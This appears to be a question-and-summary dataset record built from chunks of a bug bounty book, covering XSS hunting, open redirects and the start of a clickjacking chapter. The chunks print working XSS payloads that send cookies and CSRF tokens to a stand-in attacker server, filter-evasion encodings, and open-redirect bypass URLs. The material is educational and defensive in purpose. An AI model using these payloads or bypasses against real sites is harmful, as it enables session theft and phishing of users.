for XSS more efficiently is to use generic test\nstrings instead of XSS payloads. Insert a string of special HTML characters\noften used in XSS payloads, such as the following: >'<\"//:=;!--. Take note of\nwhich ones the application escapes and which get rendered directly. Then\nyou can construct test XSS payloads from the characters that you know the\napplication isn’t properly sanitizing.\nBlind XSS flaws are harder to detect; since you can’t detect them by\nlooking for reflected input, you can’t test for them by trying to generate an\nalert box. Instead, try making the victim’s browser generate a request to a\nserver you own. For example, you can submit the following payload, which\nwill make the victim’s browser request the page /xss on your server:\n<script src='http://YOUR_SERVER_IP/xss'></script>\nThen, you can monitor your server logs to see if anyone requests that\npage. If you see a request to the path /xss, a blind XSS has been triggered!\nTools like XSS Hunter (https://xsshunter.com/features) can automate this pro-\ncess. We’ll also talk more about setting up a server to test for multiple types\nof vulnerabilities in Chapter 13.\nFinally, although hackers typically discover new XSS vectors manu-\nally, a good way to automatically test a site for already-known XSS vectors\nis through fuzzing. We’ll talk about fuzzing and automatic bug finding in\nChapter 25.\nStep 3: Confirm the Impact\nCheck for your payload on the destination page. If you’re using an alert\nfunction, was a pop-up box generated on the page? If you’re using a\nlocation payload, did your browser redirect you offsite?\nBe aware that sites might also use user input to construct something\nother than the next returned web page. Your input could show up in future\nweb pages, email, and file portals. A time delay also might occur between\nwhen the payload is submitted and when the user input is rendered. This sit-\nuation is common in log files and analytics pages. If you’re targeting these,\nyour payload might not execute until later, or in another user’s account.\nAnd certain XSS payloads will execute under only certain contexts, such as\nwhen an admin is logged in or when the user actively clicks, or hovers over,\ncertain HTML elements. Confirm the impact of the XSS payload by brows-\ning to the necessary pages and performing those actions.\nCross-Site Scripting 125\nBypassing XSS Protection\nMost applications now implement some sort of XSS protection in their input\nfields. Often, they’ll use a blocklist to filter out dangerous expressions that\nmight be indicative of XSS. Here are some strategies for bypassing this type\nof protection.\nAlternative JavaScript Syntax\nOften, applications will sanitize <script> tags in user input. If that is the case,\ntry executing XSS that doesn’t use a <script> tag. For example, remember\nthat in certain scenarios, you can specify JavaScript to run in other types\nof tags. When you try to construct an XSS payload, you can also try to\ninsert code into HTML tag names or attributes instead. Say user input is\npassed into an HTML image tag, like this:\n<img src=\"USER_INPUT\">\nInstead of closing out the image tag and inserting a script tag, like this\n<img src=\"/><script>alert('XSS by Vickie');</script>\"/>\nyou can insert the JavaScript code directly as an attribute to the current tag:\n<img src=\"123\" onerror=\"alert('XSS by Vickie');\"/>\nAnother way of injecting code without the <script> tag is to use the spe-\ncial URL schemes mentioned before. This snippet will create a Click me!\nlink that will generate an alert box when clicked:\n<a href=\"javascript:alert('XSS by Vickie')>Click me!</a>\"\nCapitalization and Encoding\nYou can also mix different encodings and capitalizations to confuse the\nXSS filter. For example, if the filter filters for only the string \"script\", capi-\ntalize certain letters in your payload. Since browsers often parse HTML\ncode permissively and will allow for minor syntax issues like capitalization,\nthis won’t affect how the script tag is interpreted:\n<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>\nIf the application filters special HTML characters, like single and\ndouble quotes, you can’t write any strings into your XSS payload directly.\nBut you could try using the JavaScript fromCharCode() function, which\nmaps numeric codes to the corresponding ASCII characters, to create\nthe string you need. For example, this piece of code is equivalent to the\nstring \"http://attacker_server_ip/?c=\":\nString.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,\n101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)\n126 Chapter 6\nThis means you can construct an XSS payload without quotes, like this:\n<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,\n47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,\n101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>\nThe String.fromCharCode() function returns a string, given an input list\nof ASCII character codes. You can use this piece of code to translate your\nexploit string to an ASCII number sequence by using an online JavaScript\neditor, like https://js.do/, to run the JavaScript code or by saving it into an\nHTML file and loading it in your browser:\n<script>\n1 function ascii(c){\nreturn c.charCodeAt();\n}\n2 encoded = \"INPUT_STRING\".split(\"\").map(ascii);\n3 document.write(encoded);\n</script>\nThe ascii() function 1 converts characters to their ASCII numeric rep-\nresentation. We run each character in the input string through ascii() 2.\nFinally, we write the translated string to the document 3. Let’s translate\nthe payload http://attacker_server_ip/?c= by using this code:\n<script>\nfunction ascii(c){\nreturn c.charCodeAt();\n}\nencoded = \"http://attacker_server_ip/?c=\".split(\"\").map(ascii);\ndocument.write(encoded);\n</script>\nThis JavaScript code should print out \"104, 116, 116, 112, 58, 47, 47,\n97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95,\n105, 112, 47, 63, 99, 61\". You can then use it to construct your payload by\nusing the fromCharCode() method.\nFilter Logic Errors\nFinally, you could exploit any errors in the filter logic. For example, some-\ntimes applications remove all <script> tags in the user input to prevent XSS,\nbut do it only once. If that’s the case, you can use a payload like this:\n<scrip<script>t>\nlocation='http://attacker_server_ip/c='+document.cookie;\n</scrip</script>t>\nNotice that each <script> tag cuts another <script> tag in two. The filter\nwon’t recognize those broken tags as legitimate, but once the filter removes\nCross-Site Scripting 127\nthe intact tags from this payload, the rendered input becomes a perfectly\nvalid piece of JavaScript code:\n<script>location='http://attacker_server_ip/c='+document.cookie;</script>\nThese are just a handful of the filter-bypass techniques that you can try.\nXSS protection is difficult to do right, and hackers are constantly coming\nup with new techniques to bypass protection. That’s why hackers are still\nconstantly finding and exploiting XSS issues in the wild. For more filter-\nbypass ideas, check out OWASP’s XSS filter evasion cheat sheet (https://\nowasp.org/www-community/xss-filter-evasion-cheatsheet). You can also simply\nGoogle for XSS filter bypass for more interesting articles.\nEscalating the Attack\nThe impact of XSS varies because of several factors. For instance, the type\nof XSS determines the number of users who could be affected. Stored XSS\non a public forum can realistically attack anyone who visits that forum page,\nso stored XSS is considered the most severe. On the other hand, reflected\nor DOM XSS can affect only users who click the malicious link, and self-\nXSS requires a lot of user interaction and social engineering to execute, so\nthey are normally considered lower impact.\nThe identities of the affected users matter too. Let’s say a stored XSS\nvulnerability is on a site’s server logs. The XSS can affect system administra-\ntors and allow attackers to take over their sessions. Since the affected users\nare accounts of high privilege, the XSS can compromise the integrity of the\nentire application. You might gain access to customer data, internal files,\nand API keys. You might even escalate the attack into RCE by uploading a\nshell or execute scripts as the admin.\nIf, instead, the affected population is the general user base, XSS allows\nattackers to steal private data like cookies and session tokens. This can allow\nattackers to hijack any user’s session and take over the associated account.\nMost of the time, XSS can be used to read sensitive information on the\nvictim’s page. Since scripts executed during an XSS attack run as the target\npage, the script is able to access any information on that page. This means\nthat you can use XSS to steal data and escalate your attack from there. This\ncan be done by running a script that sends the data back to you. For example,\nthis code snippet reads the CSRF token embedded on the victim’s page and\nsends it to the attacker’s server as a URL parameter named token. If you can\nsteal a user’s CSRF tokens, you can execute actions on their behalf by using\nthose tokens to bypass CSRF protection on the site. (See Chapter 9 for\nmore on CSRF.)\nvar token = document.getElementsById('csrf-token')[0];\nvar xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"http://attacker_server_ip/?token=\"+token, true);\nxhr.send(null);\n128 Chapter 6\nXSS can also be used to dynamically alter the page the victim sees, so\nyou can replace the page with a fake login page and trick the user into giv-\ning you their credentials (often called phishing). XSS can also allow attack-\ners to automatically redirect the victim to malicious pages and perform\nother harmful operations while posing as the legit site, such as installing\nmalware. Before reporting the XSS you found, make sure to assess the full\nimpact of that particular XSS to include in your vulnerability report.\nAutomating XSS Hunting\nXSS hunting can be time-consuming. You might spend hours inspecting\ndifferent request parameters and never find any XSS. Fortunately, you can\nuse tools to make your work more efficient.\nFirst, you can use browser developer tools to look for syntax errors\nand troubleshoot your payloads. I also like to use my proxy’s search tool to\nsearch server responses for reflected input. Finally, if the program you are\ntargeting allows automatic testing, you can use Burp intruder or other fuzz-\ners to conduct an automatic XSS scan on your target. We will talk about this\nin Chapter 25.\nFinding Your First XSS!\nJump right into hunting for your first XSS! Choose a target and follow the\nsteps we covered in this chapter:\n1. Look for user input opportunities on the application. When user input\nis stored and used to construct a web page later, test the input field for\nstored XSS. If user input in a URL gets reflected back on the resulting\nweb page, test for reflected and DOM XSS.\n2. Insert XSS payloads into the user input fields you’ve found. Insert pay-\nloads from lists online, a polyglot payload, or a generic test string.\n3. Confirm the impact of the payload by checking whether your browser\nruns your JavaScript code. Or in the case of a blind XSS, see if you can\nmake the victim browser generate a request to your server.\n4. If you can’t get any payloads to execute, try bypassing XSS protections.\n5. Automate the XSS hunting process with techniques introduced in\nChapter 25.\n6. Consider the impact of the XSS you’ve found: who does it target? How\nmany users can it affect? And what can you achieve with it? Can you\nescalate the attack by using what you’ve found?\n7. Send your first XSS report to a bug bounty program!\nCross-Site Scripting 129",
    "question": "What are the different types of cross-site scripting (XSS) vulnerabilities and how do they differ in terms of how the malicious payload is delivered and executed?",
    "summary": "Cross-Site Scripting (XSS) is a common web vulnerability where attackers inject malicious scripts into web pages viewed by other users. There are three main types of XSS: stored, reflected, and DOM-based, each with different ways the payload is delivered and executed. To prevent XSS, applications should validate and sanitize user input, and use proper encoding to ensure user data is not interpreted as executable code. When hunting for XSS, it's important to test input fields, use payloads to trigger alerts or redirects, and consider the potential impact of the vulnerability on users and the system."
  },
  {
    "start": 91,
    "end": 99,
    "text": "7\nOPEN REDIRECTS\nSites often use HTTP or URL parameters to\nredirect users to a specified URL without any\nuser action. While this behavior can be use-\nful, it can also cause open redirects, which happen\nwhen an attacker is able to manipulate the value of this\nparameter to redirect the user offsite. Let’s discuss this\ncommon bug, why it’s a problem, and how you can use\nit to escalate other vulnerabilities you find.\nMechanisms\nWebsites often need to automatically redirect their users. For example, this\nscenario commonly occurs when unauthenticated users try to access a page\nthat requires logging in. The website will usually redirect those users to the\nlogin page, and then return them to their original location after they’re\nauthenticated. For example, when these users visit their account dashboards\nat https://example.com/dashboard, the application might redirect them to the\nlogin page at https://example.com/login.\nTo later redirect users to their previous location, the site needs to remem-\nber which page they intended to access before they were redirected to the\nlogin page. Therefore, the site uses some sort of redirect URL parameter\nappended to the URL to keep track of the user’s original location. This\nparameter determines where to redirect the user after login. For example, the\nURL https://example.com/login?redirect=https://example.com/dashboard will redirect\nto the user’s dashboard, located at https://example.com/dashboard, after login.\nOr if the user was originally trying to browse their account settings page, the\nsite would redirect the user to the settings page after login, and the URL\nwould look like this: https://example.com/login?redirect=https://example.com/settings.\nRedirecting users automatically saves them time and improves their experi-\nence, so you’ll find many applications that implement this functionality.\nDuring an open-redirect attack, an attacker tricks the user into visiting\nan external site by providing them with a URL from the legitimate site that\nredirects somewhere else, like this: https://example.com/login?redirect=https://\nattacker.com. A URL like this one could trick victims into clicking the link,\nbecause they’ll believe it leads to a page on the legitimate site, example.com.\nBut in reality, this page automatically redirects to a malicious page. Attackers\ncan then launch a social engineering attack and trick users into entering\ntheir example.com credentials on the attacker’s site. In the cybersecurity world,\nsocial engineering refers to attacks that deceive the victim. Attacks that use\nsocial engineering to steal credentials and private information are called\nphishing.\nAnother common open-redirect technique is referer-based open redi-\nrect. The referer is an HTTP request header that browsers automatically\ninclude. It tells the server where the request originated from. Referer head-\ners are a common way of determining the user’s original location, since they\ncontain the URL that linked to the current page. Thus, some sites will redi-\nrect to the page’s referer URL automatically after certain user actions, like\nlogin or logout. In this case, attackers can host a site that links to the victim\nsite to set the referer header of the request, using HTML like the following:\n<html>\n<a href=\"https://example.com/login\">Click here to log in to example.com</a>\n</html>\nThis HTML page contains an <a> tag, which links the text in the tag\nto another location. This page contains a link with the text Click here to\nlog in to example.com. When a user clicks the link, they’ll be redirected to\nthe location specified by the href attribute of the <a> tag, which is https://\nexample.com/login in this example.\nFigure 7-1 shows what the page would look like when rendered in the\nbrowser.\nFigure 7-1: Our sample rendered HTML page\n132 Chapter 7\nIf example.com uses a referer-based redirect system, the user’s browser\nwould redirect to the attacker’s site after the user visits example.com, because\nthe browser visited example.com via the attacker’s page.\nPrevention\nTo prevent open redirects, the server needs to make sure it doesn’t redirect\nusers to malicious locations. Sites often implement URL validators to ensure\nthat the user-provided redirect URL points to a legitimate location. These\nvalidators use either a blocklist or an allowlist.\nWhen a validator implements a blocklist, it will check whether the redi-\nrect URL contains certain indicators of a malicious redirect, and then\nblock those requests accordingly. For example, a site may blocklist known\nmalicious hostnames or special URL characters often used in open-redirect\nattacks. When a validator implements an allowlist, it will check the host-\nname portion of the URL to make sure that it matches a predetermined list\nof allowed hosts. If the hostname portion of the URL matches an allowed\nhostname, the redirect goes through. Otherwise, the server blocks the\nredirect.\nThese defense mechanisms sound straightforward, but the reality is\nthat parsing and decoding a URL is difficult to get right. Validators often\nhave a hard time identifying the hostname portion of the URL. This makes\nopen redirects one of the most common vulnerabilities in modern web\napplications. We’ll talk about how attackers can exploit URL validation\nissues to bypass open-redirect protection later in this chapter.\nHunting for Open Redirects\nLet’s start by looking for a simple open redirect. You can find open redirects\nby using a few recon tricks to discover vulnerable endpoints and confirm the\nopen redirect manually.\nStep 1: Look for Redirect Parameters\nStart by searching for the parameters used for redirects. These often show\nup as URL parameters like the ones in bold here:\nhttps://example.com/login?redirect=https://example.com/dashboard\nhttps://example.com/login?redir=https://example.com/dashboard\nhttps://example.com/login?next=https://example.com/dashboard\nhttps://example.com/login?next=/dashboard\nOpen your proxy while you browse the website. Then, in your HTTP\nhistory, look for any parameter that contains absolute or relative URLs.\nAn absolute URL is complete and contains all the components necessary to\nlocate the resource it points to, like https://example.com/login. Absolute URLs\ncontain at least the URL scheme, hostname, and path of a resource. A rela-\ntive URL must be concatenated with another URL by the server in order to\nOpen Redirects 133\nbe used. These typically contain only the path component of a URL, like\n/login. Some redirect URLs will even omit the first slash (/) character of the\nrelative URL, as in https://example.com/login?next=dashboard.\nNote that not all redirect parameters have straightforward names like\nredirect or redir. For example, I’ve seen redirect parameters named RelayState,\nnext, u, n, and forward. You should record all parameters that seem to be used\nfor redirect, regardless of their parameter names.\nIn addition, take note of the pages that don’t contain redirect param-\neters in their URLs but still automatically redirect their users. These pages\nare candidates for referer-based open redirects. To find these pages, you can\nkeep an eye out for 3XX response codes like 301 and 302. These response\ncodes indicate a redirect.\nStep 2: Use Google Dorks to Find Additional Redirect Parameters\nGoogle dork techniques are an efficient way to find redirect parameters. To\nlook for redirect parameters on a target site by using Google dorks, start by\nsetting the site search term to your target site:\nsite:example.com\nThen look for pages that contain URLs in their URL parameters, mak-\ning use of %3D, the URL-encoded version of the equal sign (=). By adding %3D\nin your search term, you can search for terms like =http and =https, which\nare indicators of URLs in a parameter. The following searches for URL\nparameters that contain absolute URLs:\ninurl:%3Dhttp site:example.com\nThis search term might find the following pages:\nhttps://example.com/login?next=https://example.com/dashboard\nhttps://example.com/login?u=http://example.com/settings\nAlso try using %2F, the URL-encoded version of the slash (/). The fol-\nlowing search term searches URLs that contain =/, and therefore returns\nURL parameters that contain relative URLs:\ninurl:%3D%2F site:example.com\nThis search term will find URLs such as this one:\nhttps://example.com/login?n=/dashboard\nAlternatively, you can search for the names of common URL redirect\nparameters. Here are a few search terms that will likely reveal parameters\nused for a redirect:\ninurl:redir site:example.com\ninurl:redirect site:example.com\n134 Chapter 7\ninurl:redirecturi site:example.com\ninurl:redirect_uri site:example.com\ninurl:redirecturl site:example.com\ninurl:redirect_uri site:example.com\ninurl:return site:example.com\ninurl:returnurl site:example.com\ninurl:relaystate site:example.com\ninurl:forward site:example.com\ninurl:forwardurl site:example.com\ninurl:forward_url site:example.com\ninurl:url site:example.com\ninurl:uri site:example.com\ninurl:dest site:example.com\ninurl:destination site:example.com\ninurl:next site:example.com\nThese search terms will find URLs such as the following:\nhttps://example.com/logout?dest=/\nhttps://example.com/login?RelayState=https://example.com/home\nhttps://example.com/logout?forward=home\nhttps://example.com/login?return=home/settings\nNote the new parameters you’ve discovered, along with the ones found\nin step 1.\nStep 3: Test for Parameter-Based Open Redirects\nNext, pay attention to the functionality of each redirect parameter you’ve\nfound and test each one for an open redirect. Insert a random hostname,\nor a hostname you own, into the redirect parameters; then see if the site\nautomatically redirects to the site you specified:\nhttps://example.com/login?n=http://google.com\nhttps://example.com/login?n=http://attacker.com\nSome sites will redirect to the destination site immediately after you\nvisit the URL, without any user interaction. But for a lot of pages, the\nredirect won’t happen until after a user action, like registration, login, or\nlogout. In those cases, be sure to carry out the required user interactions\nbefore checking for the redirect.\nStep 4: Test for Referer-Based Open Redirects\nFinally, test for referer-based open redirects on any pages you found in step 1\nthat redirected users despite not containing a redirect URL parameter. To test\nfor these, set up a page on a domain you own and host this HTML page:\n<html>\n<a href=\"https://example.com/login\">Click on this link!</a>\n</html>\nOpen Redirects 135\nReplace the linked URL with the target page. Then reload and visit\nyour HTML page. Click the link and see if you get redirected to your site\nautomatically or after the required user interactions.\nBypassing Open-Redirect Protection\nAs a bug bounty hunter, I find open redirects in almost all the web targets I\nattack. Why are open redirects still so prevalent in web applications today?\nSites prevent open redirects by validating the URL used to redirect the\nuser, making the root cause of open redirects failed URL validation. And,\nunfortunately, URL validation is extremely difficult to get right.\nHere, you can see the components of a URL. The way the browser redi-\nrects the user depends on how the browser differentiates between these\ncomponents:\nscheme://userinfo@hostname:port/path?query#fragment\nThe URL validator needs to predict how the browser will redirect the\nuser and reject URLs that will result in a redirect offsite. Browsers redirect\nusers to the location indicated by the hostname section of the URL. However,\nURLs don’t always follow the strict format shown in this example. They can\nbe malformed, have their components out of order, contain characters that\nthe browser does not know how to decode, or have extra or missing compo-\nnents. For example, how would the browser redirect this URL?\nhttps://user:password:8080/example.com@attacker.com\nWhen you visit this link in different browsers, you will see that different\nbrowsers handle this URL differently. Sometimes validators don’t account\nfor all the edge cases that can cause the browser to behave unexpectedly.\nIn this case, you could try to bypass the protection by using a few strategies,\nwhich I’ll go over in this section.\nUsing Browser Autocorrect\nFirst, you can use browser autocorrect features to construct alternative\nURLs that redirect offsite. Modern browsers often autocorrect URLs that\ndon’t have the correct components, in order to correct mangled URLs\ncaused by user typos. For example, Chrome will interpret all of these URLs\nas pointing to https://attacker.com:\nhttps:attacker.com\nhttps;attacker.com\nhttps:\\/\\/attacker.com\nhttps:/\\/\\attacker.com\nThese quirks can help you bypass URL validation based on a blocklist.\nFor example, if the validator rejects any redirect URL that contains the\nstrings https:// or http://, you can use an alternative string, like https;, to\nachieve the same results.\n136 Chapter 7\nMost modern browsers also automatically correct backslashes (\\) to for-\nward slashes (/), meaning they’ll treat these URLs as the same:\nhttps:\\\\example.com\nhttps://example.com\nIf the validator doesn’t recognize this behavior, the inconsistency could\nlead to bugs. For example, the following URL is potentially problematic:\nhttps://attacker.com\\@example.com\nUnless the validator treats the backslash as a path separator, it will\ninterpret the hostname to be example.com, and treat attacker.com\\ as the user-\nname portion of the URL. But if the browser autocorrects the backslash to\na forward slash, it will redirect the user to attacker.com, and treat @example\n.com as the path portion of the URL, forming the following valid URL:\nhttps://attacker.com/@example.com\nExploiting Flawed Validator Logic\nAnother way you can bypass the open-redirect validator is by exploiting\nloopholes in the validator’s logic. For example, as a common defense\nagainst open redirects, the URL validator often checks if the redirect\nURL starts with, contains, or ends with the site’s domain name. You can\nbypass this type of protection by creating a subdomain or directory with\nthe target’s domain name:\nhttps://example.com/login?redir=http://example.com.attacker.com\nhttps://example.com/login?redir=http://attacker.com/example.com\nTo prevent attacks like these from succeeding, the validator might accept\nonly URLs that both start and end with a domain listed on the allowlist.\nHowever, it’s possible to construct a URL that satisfies both of these rules.\nTake a look at this one:\nhttps://example.com/login?redir=https://example.com.attacker.com/example.com\nThis URL redirects to attacker.com, despite beginning and ending with\nthe target domain. The browser will interpret the first example.com as the\nsubdomain name and the second one as the filepath.\nOr you could use the at symbol (@) to make the first example.com the\nusername portion of the URL:\nhttps://example.com/login?redir=https://example.com@attacker.com/example.com\nCustom-built URL validators are prone to attacks like these, because\ndevelopers often don’t consider all edge cases.\nOpen Redirects 137\nUsing Data URLs\nYou can also manipulate the scheme portion of the URL to fool the valida-\ntor. As mentioned in Chapter 6, data URLs use the data: scheme to embed\nsmall files in a URL. They are constructed in this format:\ndata:MEDIA_TYPE[;base64],DATA\nFor example, you can send a plaintext message with the data scheme\nlike this:\ndata:text/plain,hello!\nThe optional base64 specification allows you to send base64-encoded\nmessages. For example, this is the base64-encoded version of the preced-\ning message:\ndata:text/plain;base64,aGVsbG8h\nYou can use the data: scheme to construct a base64-encoded redirect\nURL that evades the validator. For example, this URL will redirect to\nexample.com:\ndata:text/html;base64,\nPHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=\nThe data encoded in this URL, PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6\nLy9leGFtcGxlLmNvbSI8L3NjcmlwdD4=, is the base64-encoded version of this\nscript:\n<script>location=\"https://example.com\"</script>\nThis is a piece of JavaScript code wrapped between HTML <script>\ntags. It sets the location of the browser to https://example.com, forcing the\nbrowser to redirect there. You can insert this data URL into the redirection\nparameter to bypass blocklists:\nhttps://example.com/login?redir=data:text/html;base64,\nPHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=\nExploiting URL Decoding\nURLs sent over the internet can contain only ASCII characters, which include\na set of characters commonly used in the English language and a few special\ncharacters. But since URLs often need to contain special characters or char-\nacters from other languages, people encode characters by using URL encod-\ning. URL encoding converts a character into a percentage sign, followed by\ntwo hex digits; for example, %2f. This is the URL-encoded version of the slash\ncharacter (/).\nWhen validators validate URLs, or when browsers redirect users, they have\nto first find out what is contained in the URL by decoding any characters that\nare URL encoded. If there is any inconsistency between how the validator and\nbrowsers decode URLs, you could exploit that to your advantage.\n138 Chapter 7\nDouble Encoding\nFirst, try to double- or triple-URL-encode certain special characters in your\npayload. For example, you could URL-encode the slash character in https://\nexample.com/@attacker.com. Here is the URL with a URL-encoded slash:\nhttps://example.com%2f@attacker.com\nAnd here is the URL with a double-URL-encoded slash:\nhttps://example.com%252f@attacker.com\nFinally, here is the URL with a triple-URL-encoded slash:\nhttps://example.com%25252f@attacker.com\nWhenever a mismatch exists between how the validator and the browser\ndecode these special characters, you can exploit the mismatch to induce an\nopen redirect. For example, some validators might decode these URLs com-\npletely, then assume the URL redirects to example.com, since @attacker.com is\nin the path portion of the URL. However, the browsers might decode the\nURL incompletely, and instead treat example.com%25252f as the username\nportion of the URL.\nOn the other hand, if the validator doesn’t double-decode URLs, but\nthe browser does, you can use a payload like this one:\nhttps://attacker.com%252f@example.com\nThe validator would see example.com as the hostname. But the browser\nwould redirect to attacker.com, because @example.com becomes the path por-\ntion of the URL, like this:\nhttps://attacker.com/@example.com\nNon-ASCII Characters\nYou can sometimes exploit inconsistencies in the way the validator and\nbrowsers decode non-ASCII characters. For example, let’s say that this\nURL has passed URL validation:\nhttps://attacker.com%ff.example.com\n%ff is the character ÿ, which is a non-ASCII character. The validator has\ndetermined that example.com is the domain name, and attacker.comÿ is the\nsubdomain name. Several scenarios could happen. Sometimes browsers\ndecode non-ASCII characters into question marks. In this case, example.com\nwould become part of the URL query, not the hostname, and the browser\nwould navigate to attacker.com instead:\nhttps://attacker.com?.example.com\nOpen Redirects 139\nAnother common scenario is that browsers will attempt to find a “most alike”\ncharacter. For example, if the character ╱ (%E2%95%B1) appears in a URL like\nthis, the validator might determine that the hostname is example.com:\nhttps://attacker.com╱.example.com\nBut the browser converts the slash look-alike character into an actual\nslash, making attacker.com the hostname instead:\nhttps://attacker.com/.example.com\nBrowsers normalize URLs this way often in an attempt to be user-\nfriendly. In addition to similar symbols, you can use character sets in other\nlanguages to bypass filters. The Unicode standard is a set of codes developed\nto represent all of the world’s languages on the computer. You can find a list\nof Unicode characters at http://www.unicode.org/charts/. Use the Unicode chart\nto find look-alike characters and insert them in URLs to bypass filters. The\nCyrillic character set is especially useful since it contains many characters\nsimilar to ASCII characters.\nCombining Exploit Techniques\nTo defeat more-sophisticated URL validators, combine multiple strategies\nto bypass layered defenses. I’ve found the following payload to be useful:\nhttps://example.com%252f@attacker.com/example.com\nThis URL bypasses protection that checks only that a URL contains,\nstarts with, or ends with an allowlisted hostname by making the URL\nboth start and end with example.com. Most browsers will interpret example\n.com%252f as the username portion of the URL. But if the validator over-\ndecodes the URL, it will confuse example.com as the hostname portion:\nhttps://example.com/@attacker.com/example.com\nYou can use many more methods to defeat URL validators. In this sec-\ntion, I’ve provided an overview of the most common ones. Try each of them to\ncheck for weaknesses in the validator you are testing. If you have time, experi-\nment with URLs to invent new ways of bypassing URL validators. For example,\ntry inserting random non-ASCII characters into a URL, or intentionally mess-\ning up its different components, and see how browsers interpret it.\nEscalating the Attack\nAttackers could use open redirects by themselves to make their phishing\nattacks more credible. For example, they could send this URL in an email\nto a user: https://example.com/login?next=https://attacker.com/fake_login.html.\nThough this URL would first lead users to the legitimate website, it would\nredirect them to the attacker’s site after login. The attacker could host a fake\n140 Chapter 7\nlogin page on a malicious site that mirrors the legitimate site’s login page,\nand prompt the user to log in again with a message like this one:\nSorry! The password you provided was incorrect. Please enter\nyour username and password again.\nBelieving they’ve entered an incorrect password, the user would pro-\nvide their credentials to the attacker’s site. At this point, the attacker’s site\ncould even redirect the user back to the legitimate site to keep the victim\nfrom realizing that their credentials were stolen.\nSince organizations can’t prevent phishing completely (because those\nattacks depend on human judgment), security teams will often dismiss open\nredirects as trivial bugs if reported on their own. But open redirects can\noften serve as a part of a bug chain to achieve a bigger impact. For example,\nan open redirect can help you bypass URL blocklists and allowlists. Take\nthis URL, for example:\nhttps://example.com/?next=https://attacker.com/\nThis URL will pass even well-implemented URL validators, because\nthe URL is technically still on the legitimate website. Open redirects can,\ntherefore, help you maximize the impact of vulnerabilities like server-side\nrequest forgery (SSRF), which I’ll discuss in Chapter 13. If a site utilizes an\nallowlist to prevent SSRFs and allows requests to only a list of predefined\nURLs, an attacker can utilize an open redirect within those allowlisted\npages to redirect the request anywhere.\nYou could also use open redirects to steal credentials and OAuth tokens.\nOften, when a page redirects to another site, browsers will include the origi-\nnating URL as a referer HTTP request header. When the originating URL\ncontains sensitive information, like authentication tokens, attackers can\ninduce an open redirect to steal the tokens via the referer header. (Even\nwhen there is no open redirect on the sensitive endpoint, there are ways to\nsmuggle tokens offsite by using open redirect chains. I’ll go into detail about\nhow these attacks work in Chapter 20.)\nFinding Your First Open Redirect!\nYou’re ready to find your first open redirect. Follow the steps covered in this\nchapter to test your target applications:\n1. Search for redirect URL parameters. These might be vulnerable to\nparameter-based open redirect.\n2. Search for pages that perform referer-based redirects. These are candi-\ndates for a referer-based open redirect.\n3. Test the pages and parameters you’ve found for open redirects.\n4. If the server blocks the open redirect, try the protection bypass tech-\nniques mentioned in this chapter.\n5. Brainstorm ways of using the open redirect in your other bug chains!\nOpen Redirects 141",
    "question": "",
    "summary": "Open redirects occur when a website allows users to be redirected to any URL, potentially leading to malicious sites. Attackers can exploit this by tricking users into visiting a URL that redirects them to a phishing site, where they might enter sensitive information. Prevention involves validating redirect URLs with blocklists or allowlists, but these can be bypassed through URL encoding tricks or browser autocorrect features. Security teams may overlook open redirects as minor issues, but they can be used to escalate other vulnerabilities like phishing or SSRF."
  },
  {
    "start": 100,
    "end": 106,
    "text": "8\nCLICKJACKING\nClickjacking, or user-interface redressing,\nis an attack that tricks users into clicking\na malicious button that has been made to\nlook legitimate. Attackers achieve this by using\nHTML page-overlay techniques to hide one web page\nwithin another. Let’s discuss this fun-to-exploit vul-\nnerability, why it’s a problem, and how you can find\ninstances of it.\nNote that clickjacking is rarely considered in scope for bug bounty\nprograms, as it usually involves a lot of user interaction on the victim’s part.\nMany programs explicitly list clickjacking as out of scope, so be sure to\ncheck the program’s policies before you start hunting! However, some pro-\ngrams still accept them if you can demonstrate the impact of the clickjacking\nvulnerability. We will look at an accepted report later in the chapter.\nMechanisms\nClickjacking relies on an HTML feature called an iframe. HTML iframes\nallow developers to embed one web page within another by placing an\n<iframe> tag on the page, and then specifying the URL to frame in the tag’s\nsrc attribute. For example, save the following page as an HTML file and\nopen it with a browser:\n<html>\n<h3>This is my web page.</h3>\n<iframe src=\"https://www.example.com\" width=\"500\" height=\"500\"></iframe>\n<p>If this window is not blank, the iframe source URL can be framed!</p>\n</html>\nYou should see a web page that looks like Figure 8-1. Notice that a box\nplaces www.example.com in one area of the larger page.\nFigure 8-1: If the iframe is not blank, the page specified in the iframe’s src attribute can\nbe framed!\n144 Chapter 8\nSome web pages can’t be framed. If you place a page that can’t be\nframed within an iframe, you should see a blank iframe, as in Figure 8-2.\nFigure 8-2: If the iframe is blank, the iframe source cannot be framed.\nIframes are useful for many things. The online advertisements you\noften see at the top or sides of web pages are examples of iframes; compa-\nnies use these to include a premade ad in your social media or blog. Iframes\nalso allow you to embed other internet resources, like videos and audio, in\nyour web pages. For example, this iframe allows you to embed a YouTube\nvideo in an external site:\n<iframe width=\"560\" height=\"315\"\nsrc=\"https://www.youtube.com/embed/d1192Sqk\" frameborder=\"0\"\nallow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\"\nallowfullscreen>\n</iframe>\nClickjacking 145\nIframes have made our internet a more vibrant and interactive place.\nBut they can also be a danger to the framed web page because they intro-\nduce the possibilities of a clickjacking attack. Let’s say that example.com is a\nbanking site that includes a page for transferring your money with a click\nof a button. You can access the balance transfer page with the URL https://\nwww.example.com/transfer_money.\nThis URL accepts two parameters: the recipient account ID and the\ntransfer amount. If you visit the URL with these parameters present, such\nas https://www.example.com/transfer_money?recipient=RECIPIENT_ACCOUNT\n&amount=AMOUNT_TO_TRANSFER, the HTML form on the page will\nappear prefilled (Figure 8-3). All you have to do is to click the Submit but-\nton, and the HTML form will initiate the transfer request.\nFigure 8-3: The balance transfer page with the HTTP POST parameters prefilled\nNow imagine that an attacker embeds this sensitive 